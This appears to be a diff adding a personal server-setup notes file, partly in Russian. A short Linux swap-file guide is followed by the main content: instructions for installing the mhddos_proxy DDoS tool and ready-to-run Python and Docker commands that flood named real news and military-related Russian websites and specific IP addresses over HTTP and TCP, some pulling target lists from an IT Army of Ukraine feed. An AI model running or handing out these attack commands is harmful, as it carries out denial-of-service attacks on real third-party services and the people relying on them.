@@ -1,0 +1,91 @@
+/*aws billing dashboard  - right top  in the account button menu.All about costs*/
+Шаг 1 — Проверка информации о подкачке в системе
+sudo swapon --show
+free -h
+
+/*Шаг 2 — Проверка свободного пространства в разделе жесткого диска*/
+df -h
+
+/*Поскольку на сервере в нашем случае 1 Гбайт оперативной памяти, в этом руководстве создадим файл размером 1 Гбайт.*/
+sudo fallocate -l 1G /swapfile
+
+/*Чтобы проверить правильность выделенного объема памяти, введите:*/
+ls -lh /swapfile
+
+/*Чтобы передать все права доступа пользователям root, введите:*/
+sudo chmod 600 /swapfile
+
+/*Проверьте изменение прав доступа, введя следующее:*/
+ls -lh /swapfile
+
+/*Теперь можем отметить файл как пространство подкачки, введя следующее:*/
+sudo mkswap /swapfile
+
+/*После этого можем активировать файл подкачки, чтобы система начала использовать его:*/
+sudo swapon /swapfile
+
+
+/*Убедитесь, что пространство подкачки активировано, введя следующее:*/
+sudo swapon --show
+free -h
+
+/*Добавьте информацию о файле подкачки в конец файла /etc/fstab, введя следующее:*/
+echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
+
+/******************PYTHON атака******************************/
+
+sudo apt update -y
+sudo apt install --upgrade git -y
+sudo apt install --upgrade python3 -y
+sudo apt install --upgrade python3-pip -y
+sudo rm -r mhddos_proxy  //если было установлено ранее
+
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+ulimit -n 1048576
+sudo python3 -m pip install -r requirements.txt
+
+
+шаблон запуска:
+sudo python3 runner.py http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 -t 1000 -p 1200 --rpc 2000 --http-methods GET STRESS --debug
+
+или так с заданием от itArmyOfUkraine
+
+ python3 runner.py -t 1000 --rpc 1000 -p 350 --table --http-methods STRESS GET -c https://raw.githubusercontent.com/gidiyan/ddos_warlist/main/l7_443.lst
+
+/*********************DOCKER******************************************************************************************************/
+              sudo apt update
+              sudo apt install -y docker.io
+              sudo systemctl enable docker --now
+              docker
+              sudo usermod -aG docker $USER
+printf '%s\n' "deb https://download.docker.com/linux/debian bullseye stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list ; curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg
+
+
+              sudo apt update
+              sudo apt install -y docker-ce docker-ce-cli containerd.io
+              sudo systemctl unmask docker.service
+              sudo systemctl unmask docker.socket
+              sudo systemctl start docker.service
+              sudo chmod 666 /var/run/docker.sock
+              sudo docker run hello-world
+
+Для атаки HTTP(S) по URL
+docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 https://ria.ru https://tass.ru 
+
+Для атаки HTTP по IP + PORT 
+docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 5.188.56.124:80 5.188.56.124:3606
+
+TCP attacks-
+docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 tcp://194.54.14.131:4477 tcp://194.54.14.131:22  
+
+script updating^
+docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
+
+Для поставки задач з пабліку IT ARMY of Ukraine
+docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 --itarmy --debug
+
+To run a Docker container in the background, $ docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 --itarmy --debug      
+
+
+
